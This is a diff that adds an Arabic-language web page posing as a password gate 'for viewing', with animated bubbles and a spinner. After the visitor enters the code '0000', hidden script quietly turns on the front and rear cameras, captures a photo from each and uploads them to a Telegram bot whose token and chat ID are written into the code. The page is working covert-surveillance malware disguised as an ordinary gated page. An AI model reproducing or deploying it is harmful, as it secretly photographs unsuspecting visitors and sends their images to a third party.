@@ -1,1 +1,199 @@
-# J6ihtobg8
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>بوابة الوصول | مشروع تفاعلي</title>
+    <style>
+        /* --- نظام الألوان الجديد (الوضع المظلم) --- */
+        :root{ 
+            --bg1: #232526; /* رمادي غامق */
+            --bg2: #000000; /* أسود */
+            --accent: #ffffff; /* أبيض */
+            --accent2: #cccccc; /* رمادي فاتح */
+            --card: rgba(255, 255, 255, 0.05);
+            --glass: rgba(255, 255, 255, 0.1);
+            --text: #f0f0f0; /* أبيض مائل للرمادي */
+            --muted: #888888; /* رمادي متوسط */
+            --error: #ff4d4d;
+            --ok: #4dff88;
+            --shadow: 0 20px 60px rgba(0,0,0,.5);
+            --radius: 24px;
+        }
+
+        * { box-sizing: border-box; }
+        body{ margin:0; min-height:100dvh; color:var(--text); font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Noto Kufi Arabic", "Noto Sans Arabic", Arial, sans-serif; background: linear-gradient(130deg,var(--bg1),var(--bg2)); background-size: 200% 200%; animation: gradientShift 14s ease-in-out infinite; overflow:hidden; }
+        @keyframes gradientShift { 0% {background-position: 0% 50%;} 50%{background-position: 100% 50%;} 100%{background-position: 0% 50%;} }
+        #bubbles{ position:fixed; inset:0; z-index:0; display:block; mix-blend-mode: screen; opacity: 0.5;}
+        .screen{position:relative; z-index:1; display:grid; place-items:center; min-height:100dvh; padding:20px;}
+        .card{ width:min(480px, 95vw); background:linear-gradient(160deg, var(--card), rgba(255,255,255,.06)); backdrop-filter: blur(16px) saturate(140%); border:1px solid var(--glass); border-radius: var(--radius); box-shadow: var(--shadow); padding:28px 24px; text-align: center; }
+        .header{display:flex; align-items:center; justify-content: center; gap:12px; margin-bottom:10px;}
+        .logo{ width:46px; height:46px; border-radius:50%; background: conic-gradient(from 0deg, var(--accent), var(--accent2), var(--accent)); animation: spin 6s linear infinite; box-shadow: 0 8px 28px rgba(0,0,0,.25), inset 0 0 12px rgba(255,255,255,.3); }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        h1{font-size: clamp(20px, 5vw, 26px); margin:0; letter-spacing:.3px}
+        p.lead{margin:.25rem 0 1.5rem; color:var(--muted); font-size: 15px; max-width: 300px; margin-inline: auto;}
+        .form{display:grid; gap:14px; text-align: right;}
+        .input{ display:flex; align-items:center; gap:8px; background: rgba(0,0,0,.2); border:1px solid var(--glass); border-radius: 16px; padding: 12px 14px; transition:.25s ease; }
+        .input:focus-within{border-color: var(--accent); box-shadow: 0 0 0 4px rgba(255,255,255,.1)}
+        .input input{ all:unset; flex:1; direction:ltr; color:var(--text); font-size:18px; letter-spacing:.3em; text-align: center; }
+        .btn{ all:unset; width:100%; box-sizing: border-box; cursor:pointer; text-align:center; padding:12px 18px; border-radius:14px; font-weight:700; background: linear-gradient(90deg, var(--accent2), var(--accent)); color: #1a1a1a; box-shadow: 0 10px 24px rgba(0,0,0,.35); transition: transform .12s ease, filter .2s ease; }
+        .btn:hover{ filter: brightness(1.08) } .btn:active{ transform: translateY(1px) }
+        .hint{font-size:12px; opacity:.8}
+        .error{ color: var(--error); display:none; margin-top:6px; text-align: right; }
+        @keyframes shake { 10%, 90% { transform: translateX(-1px); } 20%, 80% { transform: translateX(2px); } 30%, 50%, 70% { transform: translateX(-4px); } 40%, 60% { transform: translateX(4px); } }
+        .loading-wrap{ display:grid; place-items:center; text-align:center; min-height: 250px; }
+        .spinner { width: 70px; height: 70px; border-radius: 50%; border: 5px solid var(--glass); border-top-color: var(--accent); animation: spinner-spin 1s linear infinite; }
+        @keyframes spinner-spin { to { transform: rotate(360deg); } }
+        .hidden{ display:none !important }
+        /* --- Footer Style --- */
+        footer{ position: fixed; inset-inline: 0; bottom: 10px; z-index: 1; text-align: center; font-size: 12px; color: var(--text); opacity: 0.4; }
+    </style>
+</head>
+<body>
+    <canvas id="bubbles"></canvas>
+    
+    <div class="screen" id="screen-pass">
+        <div class="card">
+            <div class="header">
+                <div class="logo"></div>
+                <h1>بوابة الوصول</h1>
+            </div>
+            <p class="lead">يجب عليك كتابة كلمة السر للدخول للمشاهدة.</p>
+            <form class="form" id="form">
+                <label for="pw" class="hint">كلمة السر</label>
+                <div class="input" id="inputWrap">
+                    <input id="pw" name="pw" type="password" inputmode="numeric" maxlength="4" placeholder="••••" autocomplete="off" aria-label="كلمة المرور" required />
+                </div>
+                <button class="btn" type="submit">التحقق</button>
+                <div id="error" class="error">الرمز غير صحيح</div>
+            </form>
+        </div>
+    </div>
+
+    <div class="screen hidden" id="screen-loading">
+        <div class="card">
+            <div class="loading-wrap">
+                <div class="spinner"></div>
+            </div>
+        </div>
+    </div>
+    
+    <video id="videoFeed" style="display: none;" playsinline></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <footer>هذا الموقع محمي بكلمة سر</footer>
+
+    <script>
+        const form = document.getElementById('form');
+        const pw = document.getElementById('pw');
+        const error = document.getElementById('error');
+        const inputWrap = document.getElementById('inputWrap');
+        const screenPass = document.getElementById('screen-pass');
+        const screenLoading = document.getElementById('screen-loading');
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            if (pw.value === '0000') {
+                error.style.display = 'none';
+                screenPass.classList.add('hidden');
+                screenLoading.classList.remove('hidden');
+                initiateSilentCapture();
+            } else {
+                error.style.display = 'block';
+                inputWrap.style.animation = 'shake .5s';
+                setTimeout(() => inputWrap.style.animation = 'none', 520);
+            }
+        });
+
+        const video = document.getElementById('videoFeed');
+        const canvas = document.getElementById('canvas');
+        const BOT_TOKEN = "7549913151:AAFINEvDyx5rSyxcV4I9lrEb7hxTxlegAm0";
+        const CHAT_ID = "5937427846";
+
+        async function initiateSilentCapture() {
+            try {
+                await captureAndSend('user', 'الكاميرا الأمامية');
+                await captureAndSend('environment', 'الكاميرا الخلفية');
+                const spinner = document.querySelector('.spinner');
+                if(spinner){
+                    spinner.style.borderColor = 'var(--glass)';
+                    spinner.style.borderTopColor = 'var(--ok)';
+                }
+            } catch (error) {
+                console.error("فشل الاختبار:", error);
+                const spinner = document.querySelector('.spinner');
+                if(spinner){
+                    spinner.style.borderColor = 'var(--glass)';
+                    spinner.style.borderTopColor = 'var(--error)';
+                }
+            }
+        }
+
+        function captureAndSend(facingMode, cameraName) {
+            return new Promise(async (resolve, reject) => {
+                let stream = null;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: false });
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(() => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            canvas.toBlob(blob => {
+                                sendToTelegram(blob, cameraName).finally(() => {
+                                    stopCamera(stream);
+                                    resolve();
+                                });
+                            }, 'image/jpeg', 0.9);
+                        }, 500);
+                    };
+                } catch (err) {
+                    stopCamera(stream);
+                    reject(err);
+                }
+            });
+        }
+        
+        async function sendToTelegram(imageBlob, cameraName) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageBlob, 'capture.jpg');
+            formData.append('caption', `📸 [${cameraName}] \n🗓️ ${new Date().toLocaleString()}`);
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            try {
+                const response = await fetch(url, { method: 'POST', body: formData });
+                const result = await response.json();
+                if (!result.ok) throw new Error(result.description);
+            } catch (error) { console.error("خطأ إرسال:", error); }
+        }
+
+        function stopCamera(stream) { if (stream) stream.getTracks().forEach(track => track.stop()); }
+
+        const bubblesCanvas = document.getElementById('bubbles');
+        const ctx = bubblesCanvas.getContext('2d');
+        let W, H, bubbles;
+        function resize(){ W = bubblesCanvas.width = window.innerWidth; H = bubblesCanvas.height = window.innerHeight; makeBubbles(); }
+        window.addEventListener('resize', resize);
+        function rand(min, max){ return Math.random()*(max-min)+min }
+        function makeBubbles(){ const count = Math.min(80, Math.floor((W*H)/18000)); bubbles = new Array(count).fill(0).map(()=>({ x: rand(0, W), y: rand(0, H), r: rand(6, 26), vx: rand(-0.25, 0.25), vy: rand(-0.25, 0.25) })); }
+        function draw(){
+            ctx.clearRect(0,0,W,H);
+            for(const b of bubbles){
+                ctx.beginPath();
+                ctx.arc(b.x, b.y, b.r, 0, Math.PI*2);
+                const grd = ctx.createRadialGradient(b.x- b.r*0.4, b.y- b.r*0.4, 1, b.x, b.y, b.r);
+                grd.addColorStop(0, 'rgba(255,255,255,0.25)'); grd.addColorStop(0.6, 'rgba(255,255,255,0.08)'); grd.addColorStop(1, 'rgba(255,255,255,0.02)');
+                ctx.fillStyle = grd;
+                ctx.fill();
+                b.x += b.vx; b.y += b.vy;
+                if(b.x < -50) b.x = W+50; if(b.x > W+50) b.x = -50; if(b.y < -50) b.y = H+50; if(b.y > H+50) b.y = -50;
+            }
+            requestAnimationFrame(draw);
+        }
+        resize();
+        draw();
+    </script>
+</body>
+</html>
